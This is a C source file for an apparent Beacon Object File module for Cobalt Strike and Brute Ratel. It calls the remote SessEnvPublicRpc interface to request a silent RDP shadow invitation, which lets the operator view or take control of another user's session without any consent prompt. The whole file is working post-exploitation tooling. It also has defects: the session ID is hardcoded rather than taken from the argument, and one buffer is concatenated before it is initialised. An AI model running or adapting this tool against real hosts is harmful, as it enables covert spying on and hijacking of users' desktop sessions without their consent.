#include "bofdefs.h"
#include "midl_user.c"
#include "SessEnvRpc.h"
#include "SessEnvRpc.c"

typedef struct Params {
	ULONG targetsessionid;
	wchar_t lpswzComputerName[1024];
	int controlreq;
    WCHAR** dispatch;
    HANDLE hToken;
    DWORD authType;
} Params;

void DisplayError(WCHAR **dispatch, HRESULT hr)
{
    if (HRESULT_FACILITY(hr) == FACILITY_WINDOWS)
    {
        hr = HRESULT_CODE(hr);
    }

    LPTSTR pwszStatus;
    DWORD cchBufferLength;
    if (FormatMessage)
    {
        DWORD cchMsg = FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_ALLOCATE_BUFFER,
            NULL,
            hr,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPTSTR)&pwszStatus,
            cchBufferLength,
            NULL);
        PRINT(dispatch, "%s", pwszStatus);
        free(pwszStatus);
    }
    else
    {
        PRINT(dispatch, "ERROR: %lu", hr);
    }
}

RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE* binding_handle, LPWSTR lpswzComputerName, DWORD authType)
{
    RPC_STATUS status;
    RPC_BINDING_HANDLE v5;
    RPC_SECURITY_QOS SecurityQOS = {0};
    RPC_WSTR StringBinding = NULL;
    RPC_BINDING_HANDLE Binding;

    StringBinding = 0;
    Binding = 0;
    
    status = RpcStringBindingComposeW((RPC_WSTR)L"484809d6-4239-471b-b5bc-61df8c23ac48", (RPC_WSTR)L"ncacn_np", (RPC_WSTR)lpswzComputerName, (RPC_WSTR)L"\\pipe\\SessEnvPublicRpc", NULL, &StringBinding);
    if (status == RPC_S_OK)
    {
        status = RpcBindingFromStringBindingW(StringBinding, &Binding);
        RpcStringFreeW(&StringBinding);
        if (!status)
        {
            SecurityQOS.Version = 1;
            SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
            SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
            SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;
            LPWSTR spn = NULL;

            if(authType == RPC_C_AUTHN_GSS_KERBEROS)
            {
                LPWSTR spnprepend = L"host/";
                spn = (LPWSTR)malloc((wcslen(spnprepend) + wcslen(lpswzComputerName) + 4) * sizeof(wchar_t));
                wcscat(spn, spnprepend); wcscat(spn, lpswzComputerName);
            }
            status = RpcBindingSetAuthInfoExW(Binding, (RPC_WSTR)spn, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, authType, 0, RPC_C_AUTHZ_NONE, (RPC_SECURITY_QOS*)&SecurityQOS);
            if (!status)
            {
                v5 = Binding;
                Binding = 0;
                *binding_handle = v5;
            }
            if(spn != NULL)
            {
                free(spn);
            }
        }
    }
    if (Binding)
    {
        RpcBindingFree(&Binding);
    }
    return status;
}

#ifndef _MSC_VER
#define RpcTryExcept

#endif

void execute(WCHAR** dispatch, LPWSTR lpswzComputerName, int controlreq, ULONG targetsessionid, DWORD authType)
{
    HRESULT hr = NULL;
    RPC_BINDING_HANDLE handle;
    RPC_STATUS status = CreateBindingHandle(&handle, lpswzComputerName, authType);
    SHADOW_REQUEST_RESPONSE shadowresponse = SHADOW_REQUEST_RESPONSE_DECLINE;
    LPWSTR shadowinvitation = (LPWSTR)malloc(16384);
    ULONG shadowinvitationsize = 8192;
    if (SUCCEEDED(status))
    {
        RpcTryExcept
        hr = RpcShadow2(handle, targetsessionid, controlreq, SHADOW_PERMISSION_REQUEST_SILENT, &shadowresponse, shadowinvitation, shadowinvitationsize);
        if (SUCCEEDED(hr))
        {
            if (shadowresponse == SHADOW_REQUEST_RESPONSE_ALLOW)
            {
                PRINT(dispatch, "%S", shadowinvitation);
            }
            else
            {
                PRINT(dispatch, "Access to the remote session was denied!");
            }
        }
        else 
        {
            PRINT(dispatch, "Failed obtaining invitation\nPlease verify arguments!");
        }
    }
    free(shadowinvitation);
}

LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
    MSVCRT$_endthreadex(ExceptionInfo->ExceptionRecord->ExceptionCode);
    return EXCEPTION_CONTINUE_EXECUTION;
}

unsigned __stdcall BeginStub(void* p)
{
    Params* params = (Params*)p;
    SetThreadToken(NULL, params->hToken);
    CloseHandle(params->hToken);
    execute(params->dispatch, params->lpswzComputerName, params->controlreq, params->targetsessionid, params->authType);
    return 0;
}

void shadowRDPinv(WCHAR** dispatch, LPWSTR lpswzComputerName, char* control, ULONG targetsessionid, char* authTypeString)
{
    int controlreq = 0;
    DWORD authType = RPC_C_AUTHN_WINNT;
    if (strcmp(control, "control") == 0)
    {
        controlreq = SHADOW_CONTROL_REQUEST_TAKECONTROL;
    }
    else if (strcmp(control, "view") == 0)
    {
        controlreq = SHADOW_CONTROL_REQUEST_VIEW;
    }
    else
    {
        PRINT(dispatch, "Please provide a valid control type!");
        return;
    }
    if (strcmp(authTypeString, "NTLM") == 0)
    {
        authType = RPC_C_AUTHN_WINNT;
    }
    else if (strcmp(authTypeString, "KERBEROS") == 0)
    {
        authType = RPC_C_AUTHN_GSS_KERBEROS;
    }
    else
    {
        PRINT(dispatch, "Please provide a valid authentication protocol!");
        return;
    }
    DWORD exitcode = 0;
	HANDLE thread = NULL;
	PVOID handler = NULL;
	Params * params = NULL;
    params = (Params*)malloc(sizeof(Params));
	wcscpy(params->lpswzComputerName, lpswzComputerName);
	params->controlreq = controlreq;
	params->targetsessionid = 1;
    params->dispatch = dispatch;
    params->authType = authType;
    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &params->hToken);
    handler = KERNEL32$AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)PvectoredExceptionHandler);
    thread = (HANDLE)MSVCRT$_beginthreadex(NULL, 0, BeginStub, params, 0, NULL);
    WaitForSingleObject(thread, INFINITE);
    GetExitCodeThread(thread, &exitcode);
    if (exitcode != 0)
    {
        PRINT(dispatch, "An exception occured while running: %x\n", exitcode);
    }
    if (thread) { KERNEL32$CloseHandle(thread); }
    if (handler) { KERNEL32$RemoveVectoredExceptionHandler(handler); }
	if(params) {free(params);}
}

#ifdef BOF

void go(char* args, int length) {
    datap parser = { 0 };
    BeaconDataParse(&parser, args, length);
    char* ComputerName = BeaconDataExtract(&parser, NULL);
    char* StrControlreq = BeaconDataExtract(&parser, NULL);
    char* StrSesssionId = BeaconDataExtract(&parser, NULL);
    char* authTypeString = BeaconDataExtract(&parser, NULL);
    ULONG SessionId = atoi(StrSesssionId);
    int lpswzComputerName_size = MultiByteToWideChar( CP_ACP , 0 , ComputerName , -1, NULL , 0 );
    LPWSTR lpswzComputerName = (LPWSTR)malloc((lpswzComputerName_size + 1) * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, 0, ComputerName, -1, lpswzComputerName, lpswzComputerName_size);
    shadowRDPinv(NULL, lpswzComputerName, StrControlreq, SessionId, authTypeString);
    free(lpswzComputerName);
}

#elif BRC4

void coffee(char** argv, int argc, WCHAR** dispatch) {
    char* ComputerName = argv[0];
    char* StrControlreq = argv[1];
    char* StrSesssionId = argv[2];
    char* authTypeString = argv[3];
    ULONG SessionId = atoi(StrSesssionId);
    int lpswzComputerName_size = MultiByteToWideChar( CP_ACP , 0 , ComputerName , -1, NULL , 0 );
    LPWSTR lpswzComputerName = (LPWSTR)malloc((lpswzComputerName_size + 1) * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, 0, ComputerName, -1, lpswzComputerName, lpswzComputerName_size);
    shadowRDPinv(NULL, lpswzComputerName, StrControlreq, SessionId, authTypeString);
    free(lpswzComputerName);
}
#endif
